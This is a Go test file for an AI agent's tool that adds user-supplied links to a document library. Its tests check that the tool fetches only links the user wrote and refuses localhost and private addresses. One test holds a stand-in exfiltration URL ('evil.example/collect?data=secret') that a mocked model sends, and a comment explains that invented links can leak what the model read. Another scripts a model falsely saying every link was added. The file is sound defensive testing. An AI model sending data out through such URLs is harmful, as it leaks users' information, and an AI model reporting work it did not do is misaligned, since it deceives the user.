package agent

import (
	"bytes"
	"context"
	"errors"
	"io"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/google/uuid"
	openai "github.com/sashabaranov/go-openai"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"go-monolith/internal/api"
	"go-monolith/internal/llm"
	"go-monolith/internal/webfetch"
)

// fakeFetcher answers for the links of a test: a document, or the error of webfetch.
type fakeFetcher struct {
	docs    map[string]*webfetch.Document
	errs    map[string]error
	calls   atomic.Int32
	running atomic.Int32
	peak    atomic.Int32
	hold    time.Duration
	mu      sync.Mutex
	asked   []string
}

func (f *fakeFetcher) Fetch(ctx context.Context, link string) (*webfetch.Document, error) {
	f.calls.Add(1)
	f.mu.Lock()
	f.asked = append(f.asked, link)
	f.mu.Unlock()
	now := f.running.Add(1)
	for {
		peak := f.peak.Load()
		if now <= peak || f.peak.CompareAndSwap(peak, now) {
			break
		}
	}
	defer f.running.Add(-1)
	if f.hold > 0 {
		select {
		case <-time.After(f.hold):
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}
	if err, ok := f.errs[link]; ok {
		return nil, err
	}
	if doc, ok := f.docs[link]; ok {
		return doc, nil
	}
	return pdfDoc("doc-" + uuid.NewString() + ".pdf"), nil
}

func pdfDoc(name string) *webfetch.Document {
	return &webfetch.Document{Name: name, Kind: webfetch.KindPDF, Body: bytes.NewReader([]byte("%PDF-1.4 " + name))}
}

// fakeAdder remembers what it was given; a name in dup is a file the library has already.
type fakeAdder struct {
	mu    sync.Mutex
	added map[string]string
	dup   map[string]bool
	fail  error
}

func (a *fakeAdder) Add(_ context.Context, _ uuid.UUID, name string, src io.Reader) (api.AddedFile, error) {
	body, _ := io.ReadAll(src)
	if a.fail != nil {
		return api.AddedFile{}, a.fail
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.added == nil {
		a.added = map[string]string{}
	}
	a.added[name] = string(body)
	return api.AddedFile{ID: uuid.New(), Name: name, Duplicate: a.dup[name], Size: int64(len(body))}, nil
}

// libraryAddCtx is the context of a turn in which the person wrote the given text.
func libraryAddCtx(t *testing.T, userText string) (context.Context, *turnState) {
	t.Helper()
	ctx := context.WithValue(t.Context(), api.ParsedUserIDKey, uuid.New())
	ctx, turn := withTurn(ctx, "s", false)
	turn.setUserURLs(userURLKeys([]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: userText}}))
	return ctx, turn
}

func addTool(f documentFetcher, a libraryAdder) *DefaultToolRegistry {
	return (&DefaultToolRegistry{}).WithLibraryAdd(f, a)
}

func call(t *testing.T, r *DefaultToolRegistry, ctx context.Context, urls ...string) map[string]any {
	t.Helper()
	list := make([]interface{}, len(urls))
	for i, u := range urls {
		list[i] = u
	}
	out, err := r.ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{"urls": list})
	require.NoError(t, err)
	return out.(map[string]interface{})
}

func rowsOf(t *testing.T, out map[string]any) []addRow {
	t.Helper()
	rows, ok := out["results"].([]addRow)
	require.True(t, ok)
	return rows
}

func TestTheTableTellsWhatHappenedToEachLink(t *testing.T) {
	text := "1. https://a.org/one.pdf\n2. https://b.org/two.pdf\n3. https://c.org/three\n4. https://d.org/four.pdf"
	ctx, _ := libraryAddCtx(t, text)
	f := &fakeFetcher{
		docs: map[string]*webfetch.Document{
			"https://a.org/one.pdf":  pdfDoc("one.pdf"),
			"https://b.org/two.pdf":  pdfDoc("two.pdf"),
			"https://d.org/four.pdf": pdfDoc("four.pdf"),
		},
		errs: map[string]error{"https://c.org/three": &webfetch.Error{Reason: webfetch.ReasonAbstractOnly, Detail: "the page holds only 1300 characters of text"}},
	}
	a := &fakeAdder{dup: map[string]bool{"two.pdf": true}, fail: nil}
	r := addTool(f, a)

	out := call(t, r, ctx, "https://a.org/one.pdf", "https://b.org/two.pdf", "https://c.org/three", "https://d.org/four.pdf")

	rows := rowsOf(t, out)
	require.Len(t, rows, 4)
	assert.Equal(t, addRow{URL: "https://a.org/one.pdf", Status: addQueued, File: "one.pdf"}, rows[0])
	assert.Equal(t, addDuplicate, rows[1].Status)
	assert.Equal(t, "two.pdf", rows[1].File)
	assert.Equal(t, addRefused, rows[2].Status)
	assert.Contains(t, rows[2].Reason, "abstract_only")
	assert.Equal(t, addQueued, rows[3].Status)
	assert.Equal(t, "2 of 4 queued, 1 already in the library, 1 not added", out["summary"])
	assert.Contains(t, a.added["one.pdf"], "%PDF", "the document went to the library as it was")
}

func TestTheModelGetsNoTextOnlyATable(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	r := addTool(&fakeFetcher{docs: map[string]*webfetch.Document{"https://a.org/one.pdf": pdfDoc("one.pdf")}}, &fakeAdder{})

	out := call(t, r, ctx, "https://a.org/one.pdf")

	assert.NotContains(t, strings.Join([]string{out["summary"].(string), out["note"].(string)}, " "), "%PDF")
	rows := rowsOf(t, out)
	require.Len(t, rows, 1)
	assert.NotContains(t, rows[0].File+rows[0].Reason, "%PDF")
}

// An address the model made up, or took from a page, is a way to send out what it has read.
func TestALinkTheUserDidNotWriteIsNotFetched(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "Ето го: https://a.org/one.pdf")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "https://a.org/one.pdf", "https://evil.example/collect?data=secret")

	rows := rowsOf(t, out)
	assert.Equal(t, addQueued, rows[0].Status)
	assert.Equal(t, addRefused, rows[1].Status)
	assert.Contains(t, rows[1].Reason, "did not write")
	assert.EqualValues(t, 1, f.calls.Load(), "only the link the user wrote was fetched")
	assert.Equal(t, []string{"https://a.org/one.pdf"}, f.asked)
}

// What the model writes of a link is not always what the person wrote.
func TestALinkIsRecognisedThroughTheSmallChangesAModelMakes(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "Прочети [статията](https://Example.org/papers/w16601/), и (https://b.org/x.pdf).")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "http://example.org/papers/w16601", "https://b.org/x.pdf.", "https://example.org/papers/w16601#abstract")

	rows := rowsOf(t, out)
	require.Len(t, rows, 2, "the first and the third are one link, spelled twice")
	assert.Equal(t, addQueued, rows[0].Status, "http for https, no final slash, a fragment")
	assert.Equal(t, "https://Example.org/papers/w16601/", rows[0].URL, "shown as the user wrote it")
	assert.Equal(t, addQueued, rows[1].Status, "a full stop after the link")
	assert.Empty(t, rows[0].Note, "the same link, not a corrected one")
	assert.EqualValues(t, 2, f.calls.Load())
}

func TestOnlyWhatTheUserWroteCountsNotWhatTheAssistantWrote(t *testing.T) {
	keys := userURLKeys([]openai.ChatCompletionMessage{
		{Role: openai.ChatMessageRoleAssistant, Content: "Виж https://assistant.example/a.pdf"},
		{Role: openai.ChatMessageRoleTool, Content: "https://tool.example/b.pdf"},
		{Role: openai.ChatMessageRoleUser, Content: "https://user.example/c.pdf"},
	})
	assert.Equal(t, map[string]string{"user.example/c.pdf": "https://user.example/c.pdf"}, keys)
}

func TestAnAddressOnThisMachineIsNotFetchedEvenWhenTheUserWroteIt(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "http://localhost:8080/admin и http://192.168.1.1/a.pdf и http://10.0.0.5/b.pdf")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "http://localhost:8080/admin", "http://192.168.1.1/a.pdf", "http://10.0.0.5/b.pdf")

	for _, row := range rowsOf(t, out) {
		assert.Equal(t, addRefused, row.Status, row.URL)
	}
	assert.EqualValues(t, 0, f.calls.Load())
}

func TestAtMostFourDownloadsRunAtOnce(t *testing.T) {
	var links []string
	var text strings.Builder
	for i := 0; i < 12; i++ {
		link := "https://site" + string(rune('a'+i)) + ".org/p.pdf"
		links = append(links, link)
		text.WriteString(link + "\n")
	}
	ctx, _ := libraryAddCtx(t, text.String())
	f := &fakeFetcher{hold: 40 * time.Millisecond}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, links...)

	for _, row := range rowsOf(t, out) {
		assert.Equal(t, addQueued, row.Status)
	}
	assert.EqualValues(t, 12, f.calls.Load())
	assert.LessOrEqual(t, f.peak.Load(), int32(4), "a polite number for the sites")
	assert.Greater(t, f.peak.Load(), int32(1), "and they do run side by side")
}

func TestTheCallIsMarkedAsOneThatReadTheWeb(t *testing.T) {
	ctx, turn := libraryAddCtx(t, "https://a.org/one.pdf")
	r := addTool(&fakeFetcher{}, &fakeAdder{})

	call(t, r, ctx, "https://a.org/one.pdf")

	assert.True(t, turn.has(sourceWebFetch), "the names of the files come from the pages: a write after this is a proposal, read_file is closed")
	assert.True(t, untrustedForFiles(turn))
}

func TestAServerFailureIsNotShownToTheModel(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	r := addTool(&fakeFetcher{}, &fakeAdder{fail: errors.New(`pq: password authentication failed for user "postgres"`)})

	out := call(t, r, ctx, "https://a.org/one.pdf")

	row := rowsOf(t, out)[0]
	assert.Equal(t, addRefused, row.Status)
	assert.Equal(t, "the server could not store the document", row.Reason)
	assert.NotContains(t, row.Reason, "postgres")
}

func TestADocumentOverTheLimitIsNamedAsSuch(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf https://b.org/two.pdf")
	f := &fakeFetcher{errs: map[string]error{"https://b.org/two.pdf": &webfetch.Error{Reason: webfetch.ReasonTooLarge, Detail: "the PDF is 90 MB; the limit is 50 MB"}}}
	r := addTool(f, &fakeAdder{fail: api.ErrAddTooLarge})

	out := call(t, r, ctx, "https://a.org/one.pdf", "https://b.org/two.pdf")

	rows := rowsOf(t, out)
	assert.Contains(t, rows[0].Reason, "too_large")
	assert.Contains(t, rows[1].Reason, "too_large")
}

func TestABrokenBodyIsAFailureOfTheLinkNotOfTheServer(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	r := addTool(&fakeFetcher{}, &fakeAdder{fail: webfetch.ErrTooLarge})

	out := call(t, r, ctx, "https://a.org/one.pdf")

	assert.Contains(t, rowsOf(t, out)[0].Reason, "too_large")
}

func TestTheArgumentsAreChecked(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	r := addTool(&fakeFetcher{}, &fakeAdder{})

	_, err := r.ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{})
	var argErr *toolArgumentError
	assert.ErrorAs(t, err, &argErr, "no urls")

	_, err = r.ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{"urls": []interface{}{"", "  "}})
	assert.ErrorAs(t, err, &argErr, "only blanks")

	many := make([]interface{}, maxAddURLs+1)
	for i := range many {
		many[i] = "https://a.org/" + string(rune('a'+i))
	}
	_, err = r.ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{"urls": many})
	require.ErrorAs(t, err, &argErr, "one link too many")
	assert.Contains(t, argErr.reason, "too many")

	out, err := r.ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{"urls": "https://a.org/one.pdf"})
	require.NoError(t, err, "a model that sends one link as a string")
	assert.Equal(t, addQueued, rowsOf(t, out.(map[string]interface{}))[0].Status)
}

func TestTheSameLinkTwiceIsFetchedOnce(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "https://a.org/one.pdf", "https://a.org/one.pdf")

	assert.Len(t, rowsOf(t, out), 1)
	assert.EqualValues(t, 1, f.calls.Load())
}

func TestACancelledCallTriesNothing(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	ctx, cancel := context.WithCancel(ctx)
	cancel()
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "https://a.org/one.pdf")

	row := rowsOf(t, out)[0]
	assert.Equal(t, addRefused, row.Status)
	assert.Contains(t, row.Reason, "call again")
	assert.EqualValues(t, 0, f.calls.Load())
}

func TestWithoutAFetcherTheToolDoesNotExist(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")

	_, err := (&DefaultToolRegistry{}).ExecuteTool(ctx, addToLibraryTool, map[string]interface{}{"urls": []interface{}{"https://a.org/one.pdf"}})

	require.Error(t, err)
	assert.Contains(t, err.Error(), "unknown tool")
}

func TestTheLinksOfAMessageAreFoundWithoutTheirPunctuation(t *testing.T) {
	text := "Lou, Polk, [A Tug of War](https://researchonline.lse.ac.uk/id/eprint/87481) (JFE 2019).\n" +
		"- Kaminski, Lo, [When Do Stop-Loss Rules Stop Losses?](https://dspace.mit.edu/handle/1721.1/114876) (JFM 2014).\n" +
		"Виж https://doi.org/10.1016/S0304-405X(98)00026-9, или http://x.org/a.pdf. Край!"
	assert.Equal(t, []string{
		"https://researchonline.lse.ac.uk/id/eprint/87481",
		"https://dspace.mit.edu/handle/1721.1/114876",
		"https://doi.org/10.1016/S0304-405X(98)00026-9",
		"http://x.org/a.pdf",
	}, extractURLs(text))
	assert.Empty(t, extractURLs("няма линк тук, само example.org"))
}

func TestTheToolIsOfferedOnlyWhereTheUserWroteALink(t *testing.T) {
	on := &Orchestrator{addToLibrary: true}
	off := &Orchestrator{}
	withLink := userURLKeys([]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: "виж https://a.org/x.pdf"}})
	noLink := userURLKeys([]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: "здравей"}})

	assert.True(t, on.offersLibraryAdd(withLink))
	assert.False(t, on.offersLibraryAdd(noLink))
	assert.False(t, off.offersLibraryAdd(withLink), "the flag is off")
	assert.Equal(t, addToLibraryTool, addToLibraryDefinition().Function.Name)
}

// The definition costs tokens in every request that carries it; the budget of the history
// pays for it. Measured with the tokenizer of the model on 2026-11-20 (see the plan).
func TestTheDefinitionStaysWithinItsReservedTokens(t *testing.T) {
	def := addToLibraryDefinition()
	size := len(def.Function.Name) + len(def.Function.Description)
	for k, v := range def.Function.Parameters.(map[string]any)["properties"].(map[string]any)["urls"].(map[string]any) {
		size += len(k)
		if s, ok := v.(string); ok {
			size += len(s)
		}
	}
	// About 4 characters a token; the reservation has room for twice that.
	assert.Less(t, size/4, libraryAddTokens)
}

// Every reason a link can be refused for has its words for the person.
func TestEveryRefusalHasWordsForThePerson(t *testing.T) {
	for _, code := range []string{
		"not_written", "not_public", "not_tried", "empty", "error",
		string(webfetch.ReasonBlocked), string(webfetch.ReasonRateLimited), string(webfetch.ReasonNotFound),
		string(webfetch.ReasonUnreachable), string(webfetch.ReasonTimeout), string(webfetch.ReasonTooLarge),
		string(webfetch.ReasonUnsupported), string(webfetch.ReasonAbstractOnly), string(webfetch.ReasonNotPublic),
		string(webfetch.ReasonBadURL),
	} {
		assert.NotEmpty(t, libraryRefusals[code], code)
	}
}

func TestTheReportListsOnlyWhatWasNotAdded(t *testing.T) {
	rows := []addRow{
		{URL: "https://a.org/1.pdf", Status: addQueued},
		{URL: "https://b.org/2", Status: addDuplicate},
		{URL: "https://c.org/3", Status: addRefused, Code: "abstract_only"},
		{URL: "https://d.org/4", Status: addRefused, Code: "not_written"},
	}

	report := libraryReport(rows)

	assert.Contains(t, report, "(2 от 4)")
	assert.Contains(t, report, "• https://c.org/3 — страницата е само резюме")
	assert.Contains(t, report, "• https://d.org/4 — този линк не е написан от теб")
	assert.NotContains(t, report, "a.org")
	assert.NotContains(t, report, "b.org")
	assert.Equal(t, "", libraryReport(rows[:2]), "nothing to tell when everything is in")
	assert.Equal(t, "", libraryReport(nil))
}

// The real runs of 2026-11-20: the model dropped "i:2" from one link, the tool refused it,
// and the model wrote that all of them were added.
func TestTheAnswerCarriesTheLinksThatWereNotAddedWhateverTheModelSays(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf https://econpapers.repec.org/RePEc:eee:jfinec:v:129:y:2018:i:2:p:394-414")
	const invented = "https://papers.example.org/collect/q2"
	reg := addTool(&fakeFetcher{}, &fakeAdder{})
	mock := &llm.MockLLM{StreamScript: [][]openai.ChatCompletionStreamResponse{
		{toolCallChunk(0, "call_1", addToLibraryTool, `{"urls":["https://a.org/one.pdf","`+invented+`"]}`)},
		{textChunk("Всички линкове са добавени и се обработват.")},
	}}
	o := newGroupOrchestrator(mock, reg)
	var streamed strings.Builder

	content, _, executed, err := o.generateResponse(ctx,
		[]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: "добави ги в библиотеката"}}, append(o.turnTools(), addToLibraryDefinition()),
		func(delta, _ string) error { streamed.WriteString(delta); return nil })

	require.NoError(t, err)
	assert.Equal(t, []string{addToLibraryTool}, toolCallNames(executed))
	assert.True(t, strings.HasPrefix(content, "Всички линкове са добавени и се обработват."), "the answer of the model stays")
	assert.Contains(t, content, "⚠️ Не са добавени в библиотеката (1 от 2):")
	assert.Contains(t, content, "• "+invented+" — този линк не е написан от теб")
	assert.Equal(t, content, streamed.String(), "what was streamed is what is stored")
}

func TestAnAnswerAfterLinksThatWereAllAddedGetsNoReport(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	reg := addTool(&fakeFetcher{}, &fakeAdder{})
	mock := &llm.MockLLM{StreamScript: [][]openai.ChatCompletionStreamResponse{
		{toolCallChunk(0, "call_1", addToLibraryTool, `{"urls":["https://a.org/one.pdf"]}`)},
		{textChunk("Добавен е.")},
	}}
	o := newGroupOrchestrator(mock, reg)

	content, _, _, err := o.generateResponse(ctx,
		[]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: "добави го в библиотеката"}}, append(o.turnTools(), addToLibraryDefinition()), nil)

	require.NoError(t, err)
	assert.Equal(t, "Добавен е.", content)
}

// The report does not depend on the file tools being on.
func TestTheReportIsAddedWithoutTheFileGroupToo(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://a.org/one.pdf")
	reg := addTool(&fakeFetcher{errs: map[string]error{"https://a.org/one.pdf": &webfetch.Error{Reason: webfetch.ReasonBlocked, Detail: "the site answered 403"}}}, &fakeAdder{})
	mock := &llm.MockLLM{StreamScript: [][]openai.ChatCompletionStreamResponse{
		{toolCallChunk(0, "call_1", addToLibraryTool, `{"urls":["https://a.org/one.pdf"]}`)},
		{textChunk("Готово.")},
	}}
	o := &Orchestrator{llmClient: mock, tools: reg}

	content, _, _, err := o.generateResponse(ctx,
		[]openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: "добави го"}}, append(toolDefinitions(), addToLibraryDefinition()), nil)

	require.NoError(t, err)
	assert.Contains(t, content, "сайтът не пуска програми (401/403)")
}

func TestWhatCountsAsALinkTheUserWrote(t *testing.T) {
	_, turn := libraryAddCtx(t, "виж https://a.org/one.pdf")

	assert.True(t, turn.wroteURL("https://a.org/one.pdf"))
	assert.True(t, turn.wroteURL("  http://A.org/one.pdf/  "))
	for _, not := range []string{"", "   ", "not a link", "https://", "https://b.org/one.pdf", "https://a.org/two.pdf"} {
		assert.False(t, turn.wroteURL(not), "%q", not)
	}
	var none *turnState
	assert.False(t, none.wroteURL("https://a.org/one.pdf"), "outside a turn nothing is written by the user")
	assert.False(t, (&turnState{}).wroteURL(""), "an empty address is no address, whatever the set holds")
}

// The live runs of 2026-11-20: the model copied 21 long links and dropped "i:2" from one in
// 4 of 6 runs. The link it meant is a link the user wrote: that one is fetched.
func TestALinkWithAFewCharactersWrongIsTheLinkTheUserWrote(t *testing.T) {
	written := "https://econpapers.repec.org/RePEc:eee:jfinec:v:129:y:2018:i:2:p:394-414"
	ctx, _ := libraryAddCtx(t, "виж "+written+" и https://nber.org/papers/w17653")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, "https://econpapers.repec.org/RePEc:eee:jfinec:v:129:y:2018:i:p:394-414")

	rows := rowsOf(t, out)
	require.Len(t, rows, 1)
	assert.Equal(t, addQueued, rows[0].Status)
	assert.Equal(t, written, rows[0].URL, "the link of the user, not the one the model sent")
	assert.Contains(t, rows[0].Note, "differed")
	assert.Equal(t, []string{written}, f.asked, "and only that was fetched")
}

func TestTwoSpellingsOfOneLinkAreFetchedOnce(t *testing.T) {
	written := "https://www.example.org/working-papers/paper-0001.pdf"
	ctx, _ := libraryAddCtx(t, written)
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx, written, "https://www.example.org/working-papers/paper-001.pdf")

	assert.Len(t, rowsOf(t, out), 1)
	assert.EqualValues(t, 1, f.calls.Load())
}

func TestALinkThatIsNotClearlyOneOfTheUsersLinksIsRefused(t *testing.T) {
	ctx, _ := libraryAddCtx(t, "https://www.example.org/working-papers/paper-0001.pdf https://www.example.org/working-papers/paper-0003.pdf https://a.org/x")
	f := &fakeFetcher{}
	r := addTool(f, &fakeAdder{})

	out := call(t, r, ctx,
		"https://www.example.org/working-papers/paper-0002.pdf",  // as near to two links as to the other
		"https://evil.example/working-papers/paper-0001.pdf",     // another host
		"https://www.example.org/working-papers/other-title.pdf", // too far
		"https://a.org/y", // a short address: one character is another address
	)

	for _, row := range rowsOf(t, out) {
		assert.Equal(t, addRefused, row.Status, row.URL)
		assert.Contains(t, row.Reason, "did not write")
	}
	assert.EqualValues(t, 0, f.calls.Load())
}

func TestNearestLink(t *testing.T) {
	written := map[string]string{
		"example.org/working-papers/paper-0001.pdf": "https://example.org/working-papers/paper-0001.pdf",
		"example.org/working-papers/paper-0003.pdf": "https://example.org/working-papers/paper-0003.pdf",
		"example.org/working-papers/paper-0042.pdf": "https://example.org/working-papers/paper-0042.pdf",
		"other.org/working-papers/paper-0001.pdf":   "https://other.org/working-papers/paper-0001.pdf",
	}
	link, ok := nearestLink("example.org/working-papers/paper-001.pdf", written)
	assert.True(t, ok)
	assert.Equal(t, "https://example.org/working-papers/paper-0001.pdf", link, "a character dropped")

	link, ok = nearestLink("example.org/working-papers/paper-0011.pdf", written)
	assert.True(t, ok, "one character off paper-0001, two off the others: the nearer one")
	assert.Equal(t, "https://example.org/working-papers/paper-0001.pdf", link)

	_, ok = nearestLink("example.org/working-papers/paper-0002.pdf", written)
	assert.False(t, ok, "as near to paper-0001 as to paper-0003")

	_, ok = nearestLink("third.org/working-papers/paper-0001.pdf", written)
	assert.False(t, ok, "no link of the user on that host")

	_, ok = nearestLink("example.org/working-papers/paper-0001.pdf?x=1", nil)
	assert.False(t, ok, "nothing written")

	// four characters are too many for a short address: a tenth of it at most
	short := map[string]string{"example.org/abcdefghijklmnop": "https://example.org/abcdefghijklmnop"}
	_, ok = nearestLink("example.org/abcdefghijklmnop", short)
	assert.True(t, ok, "the same address")
	_, ok = nearestLink("example.org/abXXefghijklXXop", short)
	assert.False(t, ok, "four of 28 characters")
	_, ok = nearestLink("example.org/abcdefghijklmnXX", short)
	assert.True(t, ok, "two of 28 characters")
}

func TestTheFirstSpellingTheUserWroteIsKept(t *testing.T) {
	keys := userURLKeys([]openai.ChatCompletionMessage{
		{Role: openai.ChatMessageRoleUser, Content: "https://Example.org/a.pdf"},
		{Role: openai.ChatMessageRoleUser, Content: "https://example.org/a.pdf/"},
	})
	assert.Equal(t, map[string]string{"example.org/a.pdf": "https://Example.org/a.pdf"}, keys)
}

func TestEditDistance(t *testing.T) {
	for _, c := range []struct {
		a, b string
		want int
	}{
		{"", "", 0}, {"abc", "abc", 0}, {"abc", "", 3}, {"", "ab", 2},
		{"kitten", "sitting", 3}, {"i:2:p", "i:p", 2}, {"абв", "абг", 1},
	} {
		assert.Equal(t, c.want, editDistance(c.a, c.b), "%q %q", c.a, c.b)
	}
}
